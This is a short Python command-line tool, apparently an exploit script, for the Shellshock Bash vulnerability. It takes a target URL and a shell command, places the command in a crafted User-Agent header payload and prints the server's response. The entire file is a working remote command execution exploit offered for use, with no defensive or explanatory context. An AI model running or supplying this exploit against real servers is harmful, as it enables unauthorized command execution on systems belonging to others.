import click, requests

@click.command()
@click.argument("url")
@click.argument("cmd")
def command(url, cmd):
    """Exploit Shellshock via HTTP headers."""
    headers = {"User-Agent": f"() {{ :; }}; echo; {cmd}"}
    r = requests.get(url, headers=headers)
    click.echo(r.text)